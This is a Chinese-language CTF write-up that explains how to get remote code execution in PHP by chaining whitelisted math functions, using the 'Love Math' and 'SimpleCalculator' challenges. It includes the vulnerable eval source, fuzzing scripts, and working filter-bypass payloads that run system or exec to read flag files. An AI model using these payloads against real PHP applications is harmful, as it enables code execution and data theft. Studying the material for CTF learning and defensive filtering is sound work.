# php利用math函数rce总结

阅读量 **239545**

|评论 **3**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-11-03 15:30:57

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p1.ssl.qhimg.com/t017687e03d2b5a69eb.png)

## 0x00 前言

由 2019 国赛 love math 而来，国赛题目质量一直可以的，“数学题”近年来也不少，比如今年护网杯，但网上一些博客写得不够基础，比如 php
异或的原理是什么？为什么两个字符串异或会得到这个？完全没有解答。

写这篇文章的目的，就是从基础层面上，收集师傅们的各种解题方法来总的分析一下—— php 怎么利用数学函数来代码执行。

## 0x01 题解

###  Love Math

    
    
    <?php
    error_reporting(0);
    //听说你很喜欢数学，不知道你是否爱它胜过爱flag
    if(!isset($_GET['c'])){
        show_source(__FILE__);
    }else{
        //例子 c=20-1
        $content = $_GET['c'];
        if (strlen($content) >= 80) {
            die("太长了不会算");
        }
        //ban 了单双反引号，不能直接利用 eval 命令执行
        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
        foreach ($blacklist as $blackitem) {
            if (preg_match('/' . $blackitem . '/m', $content)) {
                die("请不要输入奇奇怪怪的字符");
            }
        }
        //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
        $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
        preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
        foreach ($used_funcs[0] as $func) {
            if (!in_array($func, $whitelist)) {
                die("请不要输入奇奇怪怪的函数");
            }
        }
        //帮你算出答案
        eval('echo '.$content.';');
    }
    

get 传参 c ，长度限制 80 ，有黑白名单，简而言之，要求你构造一个用白名单函数，又不包括黑名单符号的 payload 来命令执行。

白名单中数学函数分两种利用方法，进制转换和异或，旨在调用 **能返回字符串** 的数学函数达到命令执行的目的。

* * *

###  数学函数的利用

####  进制转换函数

这里参考了 [N0rths 一血师傅的博客](https://northity.com/2019/04/23/CISCN2019Web-WP/#love-math)

白名单里进制转换的函数：

    
    
    'base_convert', 'bindec', 'decbin', 'dechex', 'hexdec', 'decoct','octdec'
    

函数解释：

> `base_convert(number,frombase,tobase)`
>
> 在任意进制之间转换数字。
>
> `dechex(dec_number)`
>
> 把十进制转换为十六进制。返回一个字符串，包含有给定 _binary_string_ 参数的十六进制表示。所能转换的最大数值为十进制的
> 4294967295，其结果为 “ffffffff”。
>
> `hexdec(hex_string)`
>
> 把十六进制转换为十进制。返回与 _hex_string_ 参数所表示的十六进制数等值的的十进制数。
>
> 其他的 `decbin` `decbin` `decoct` `octdec` 同上，分别是二进制、八进制与十进制的互转。

十六进制的字母范围只有 a-f ，显然是不符合我们构造的要求，而三十六进制字母范围正好为 a-z 。

而 `base_convert` 正好能在任意进制转换数字，这样我们传入十进制的数字，使其转换为三十六进制时，返回的字符串是我们想要的 `cat`
等命令就行了。

反过来构造，例如：

    
    
    echo base_convert("cat",36,10);
    //15941
    

但这里，虽然可以构造纯字母字符串了，但进制转换显然不能返回 `.` `/` `*` 等特殊字符，而这就需要用到另一类运算函数。

####  运算函数

比如我们要构造 `system('cat *')`

那么我们需要返回 `空格*` 这样的函数，而 php 中函数名默认为字符串，可以进行异或。

> [php 异或](https://www.php.net/manual/zh/language.operators.bitwise.php)
>
> php 中异或运算符 `^` 是位运算符，如果进行运算的都是数字的话：
>
> ![](https://p3.ssl.qhimg.com/t01c49b4cff433546be.png)
>
> 将会先转换为二进制来按位异或，比如：
>  
>  
>     echo 12 ^ 9; // Outputs '5'
>  
>
> 但如果进行运算的有字符串呢？
>  
>  
>     echo "12" ^ "9"; // Outputs the Backspace character (ascii 8)
>                   // ('1' (ascii 49)) ^ ('9' (ascii 57)) = #8
>
>     echo "hallo" ^ "hello"; // Outputs the ascii values #0 #4 #0 #0 #0
>                          // 'a' ^ 'e' = #4
>
>     echo 2 ^ "3"; // Outputs 1
>                // 2 ^ ((int)"3") == 1
>
>     echo "2" ^ 3; // Outputs 1
>                // ((int)"2") ^ 3 == 1
>  
>
> 长度一致时，会先把字符串按位转换为 ascii 码，再将 ascii 码转换为二进制进行按位异或，最后输出 ascii 为异或结果的字符。
>
> 长度不一致时，按最短的字符串长度按位异或，比如 `"12" ^ "9"` 的例子。
>
> 按位异或运算的几个性质：
>
>   1. 结合律a ^ b ^ c = a ^ c ^ b
>   2. 交换律a ^ b = b ^ a
>   3. 数值交换（能交换 a 与 b 的值）a = a ^ b; b = a ^ b; a = a ^ b;
>

>
> 而我们要构造有 `空格*` 该怎么利用异或呢？
>
> 由上面的性质 1 其实就已经明确了，`"a"^"a"` 结果是多少呢？相同即 0 ，也就是说，其 ascii 全 0 ，ascii 全 0
> 按位异或，得到的不就完全是另外一个 ascii 码吗，换言之，`"a"^"x"^"a"` 无论怎么调换顺序，输出的都是 x 的ascii 码 120
> ，无论 x 被替换为什么，都是一样的结果。
>
> 这也是 N0rths 师傅在博客中写的脚本中是 `echo $k^$i^" *";` 的原因，想得到 `空格*` 就找 `k` 和 `i`
> 能异或出另外一个数学函数 `dechex` 构造的值，取的值自然是我们这里的白名单函数，前面说过，函数名默认为字符串。

师傅的爆破脚本

    
    
    <?php
    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    $whitelist2 = [ 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh','abs'];
    
    foreach ($whitelist as $i):
        foreach ($whitelist2 as $k):
        echo $k^$i^" *";
        echo "   " . $i . " " . $k;
        echo "<br/>";
        endforeach;
    endforeach;
    

理解上述这些后，来分析下师傅最终的 payload：

    
    
    base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi))
    //base_convert(1751504350,10,36) ->system
    //base_convert(15941,10,36) -> cat
    //system('cat *')
    

![](https://p0.ssl.qhimg.com/t018a569d7c9afa2f4f.png)

而 `dechex(16)` 返回的值正好是 10 ，所以 `dechex(16)^asinh^pi` 这个表达式就相当于 `asinh^pi^"
*"^asinh^pi` 也就相当于 `" *"^"a"^"a"` 输出自然就是 `空格*` 。

当然构造不止 `asinh^pi` ，其他也能异或出 `空格*` ，只需要找到异或结果为十六进制形式的组合，再找到转十六进制与其相等的一个十进制数，利用
`hexdec()` 进行异或即可。

![](https://p0.ssl.qhimg.com/t016a8bcda363576ab5.png)

`dechex(11)^atan2^pow` 的结果也为 `空格*`

当然，既然能异或出特殊字符，那么异或出字母也不是什么难事，我们可以不用进制转换来构造关键字。

这部分放在下面的构造 `_GET` 绕过来一起分析。

* * *

接下来我们再来学习绕过的操作，N0rths 师傅是直接读取 flag 的，除了 `cat *` 以外，师傅还提到了 `nl f*`
这个命令来读取，以图为例：

![](https://p1.ssl.qhimg.com/t01b2670cdf1c2a86f6.png)

命令解释：

> `nl [参数] [文件]`
>
> nl命令是一个很好用的编号过滤工具。该命令可以读取 File 参数（缺省情况下标准输入），计算输入中的行号，将计算过的行号写入标准输出。

###  绕过姿势

####  构造 _GET

因为黑名单字符过滤较多，我们也可以用 `_GET[]` 来传 `system` 之类的命令，但 `[]` 被过滤了，师傅提到的一个 trick 就是
`{}` 代替 `[]` 。

先上 payload ：

    
    
    $pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&pi=system&abs=tac flag.php
    // base_convert(37907361743,10,36) -> hex2bin
    // dechex(1598506324) -> 5f474554
    // hex2bin("5f474554") -> _GET
    

payload 的 `(pi){pi}((pi){abs})` 这一串又是什么意思呢？为什么能将变量 `pi` 的值作为函数使用？

这里牵扯到 php 可变变量和可变函数的用法。

> [php 可变变量](https://www.php.net/manual/zh/language.variables.variable.php)
>
> 简而言之，一个变量的变量名可以动态的设置和使用。一个普通的变量通过声明来设置，例如：
>  
>  
>     $a = "land";
>  
>
> 而一个可变变量获取了一个普通变量的值作为这个可变变量的变量名。
>  
>  
>     $$a = "vidar";
>  
>
> 这时，两个变量都被定义了：`$a` 的内容是 `“land”` 并且 `$land` 的内容是 `“vidar”` 。
>
> 回到正题，`$pi` 的值为 `hex2bin("5f474554")` ，`$$pi` 也就是 `$hex2bin("5f474554") ->
> $_GET` ，变成了预定义变量。
>
> [php 可变函数](https://www.php.net/manual/zh/functions.variable-functions.php)
>
> PHP 支持可变函数的概念。这意味着如果一个变量名后有圆括号，PHP
> 将寻找与变量的值同名的函数，并且尝试执行它。可变函数可以用来实现包括回调函数，函数表在内的一些用途。
>
> 上面说过，`{}` 其实是代替 `[]` ，其实本为 `(pi)[pi]((pi)[abs])` ，即 `_GET[pi]((_GET)[abs])`
> ，
>
> 而 `pi` 的值正好是 `system` ，php 就会寻找 `system` 函数来执行圆括号里的语句。
>
> 即 `system('tac flag.php')`

而上面说过，我们可以不利用进制转换，单纯异或构造语句：

    
    
    $pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi{0}($pi{1})&0=system&1=cat /flag
    

同样这里利用了 php 可变变量和可变函数，但异或的对象有所不同，前文中明摆着我们是两个字符串相异或，而这里的 `is_nan^(6).(4)`
又会是什么结果呢？

[Mustapha Mond 师傅的 fuzz
脚本](https://www.cnblogs.com/20175211lyz/p/11588219.html)

    
    
    <?php
    $payload = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh',  'bindec', 'ceil', 'cos', 'cosh', 'decbin' , 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    for($k=1;$k<=sizeof($payload);$k++){
        for($i = 0;$i < 9; $i++){
            for($j = 0;$j <=9;$j++){
                $exp = $payload[$k] ^ $i.$j;
                echo($payload[$k]."^$i$j"."==>$exp");
                echo "<br />";
            }
        }
    }
    

这里的 `$i.$j` 其实是字符串类型，也就是我们利用数学函数名与 01~99 范围的字符串想异或，这样我们可以得到字母（当然部分特殊字符也能得出）：

![](https://p0.ssl.qhimg.com/t01e60956621f5ed21c.png)

而 payload 中的 `(is_nan^(6).(4)).(tan^(1).(5))` 正是 `"_G"."ET"` ，即 `_GET` 。

####  getallheaders 利用请求头传语句

长度限制 80 是很容易超长的，何况还有白名单函数的限制，不能直接输入 `cat` 等命令，而我们可以利用 `getallheaders`
这个函数，把命令放在请求头来拼接语句。

函数解释：

> [getallheaders](https://www.php.net/manual/zh/function.getallheaders.php)
>
> 获取全部 HTTP 请求头信息。

payload：

    
    
    $pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)(){1})
    //base_convert(696468,10,36) -> exec
    //base_convert(8768397090111664438,10,30) -> getallheaders
    //exec(getallheaders(){1})
    

在报文头中相应属性，值为要执行的命令：

![](https://p3.ssl.qhimg.com/t01eeba41244dc114af.png)

好了，love math 到此告一段落，来看看今年的护网杯的 SimpleCalculator 。

## SimpleCalculator

###  取反绕过

这题其实 love math 的异或 payload 就能打出来，摆出这道题其实只是为了介绍另外一种运算 `~` 。

> `~` 运算符
>
> 按位取反，将 `$a` 中为 0 的位设为 1，反之亦然。
>
> 也就是说，我们要返回 `system` ，可以按位用其反码来构造 payload 。

因为记忆比较模糊，可能说的不太准确，当初 fuzz 的时候，其实输入框的限制是非常严格的：

    
    
    _ ' " 空格 hex2bin、dechex、chr等等一些可以与字符互转的函数 system、exec等等一些可以命令执行的函数
    

上面这些都被匹配到了，长度还限制 80 ，但对 url 上的却有松懈，因此可以说是 yt 。

这里要分析的是本校师傅给的一个神奇 payload ：

    
    
    $ip=(~%8C%86%8C%8B%9A%92);$ip(~%9C%9E%8B%DF%D0%99%93%9E%98);
    

`%8C%86%8C%8B%9A%92` 这些是 url 编码，解码后转换为 ascii 码，ascii
码再转换为二进制数，取其反码，然后逆操作，最后得到的值就是 `system` 。

以 `%8C` 为例，进行的运算用函数表示如下：

    
    
    echo chr(~ord(urldecode('%8C')));
    //s
    

exp：

    
    
    <?php
    $pay = "system";
    $re = "";
    for ($i = 0; $i < strlen($pay); $i++){
        $pay[$i] = chr(~ord($pay[$i]));
        $re.= urlencode($pay[$i]);
    }
    echo $re;
    ?>
    

#  0x03 后记

其实通篇看下来，最主要利用的是 php 位运算、可变变量、可变函数这些特性，用 math 函数结合 rce
（这是次要的）。感觉还是要潜心学习一门语言，把它的特性深入了解后，才能在安全方面发挥最大作用。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **landvsec** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/220813](/post/id/220813)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)

 **+1** __5赞

 __收藏

![](https://p1.ssl.qhimg.com/t0148e6c6cea2b6f0ec.png) landvsec

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

